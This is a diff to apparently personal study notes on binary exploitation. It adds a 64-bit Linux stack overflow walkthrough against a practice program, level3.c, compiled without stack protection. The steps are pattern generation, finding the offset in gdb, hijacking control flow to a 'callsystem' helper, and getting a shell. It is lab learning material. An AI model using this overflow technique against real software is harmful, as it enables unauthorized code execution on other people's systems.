@@ -136,3 +136,37 @@ $ python exp3.py<br>
 [ * ] Switching to interactive mode<br>
 $ whoami<br>
 [用户名] <br><br>
+
+##linux_64
+###linux_64溢出攻击（利用辅助函数）
+$ gcc -fno-stack-protector level3.c -o level3<br>
+$ python pattern.py create 150 > payload<br>
+$ gdb ./level3<br>
+(gdb) run < payload<br>
+Starting program: /home/dzh/learning/level3 < payload<br>
+Hello, World<br>
+
+Program received signal SIGSEGV, Segmentation fault.<br>
+0x00000000004005e7 in vulnerable_function ()<br>
+(gdb) x/gx $rsp<br>
+0x7fffffffde68:	0x3765413665413565<br>
+(gdb) quit<br>
+$ python pattern.py offset 0x3765413665413565<br>
+hex pattern decoded as: e5Ae6Ae7<br>
+136<br>
+python -c 'print "A"*136+"ABCDEF\x00\x00"'>payload<br>
+$ gdb ./level3<br>
+(gdb) run < payload<br>
+Starting program: /home/dzh/learning/level3 < payload<br>
+Hello, World<br>
+
+Program received signal SIGSEGV, Segmentation fault.<br>
+0x0000464544434241 in ?? ()<br>
+(gdb) quit<br>
+$ objdump -d level3 | grep callsystem<br>
+00000000004005b6 <callsystem>:<br>
+python exp5.py<br>
+[ * ].......<br>
+[ * ] Switching to interactive mode<br>
+$ whoami<br>
+[用户名] <br><br>
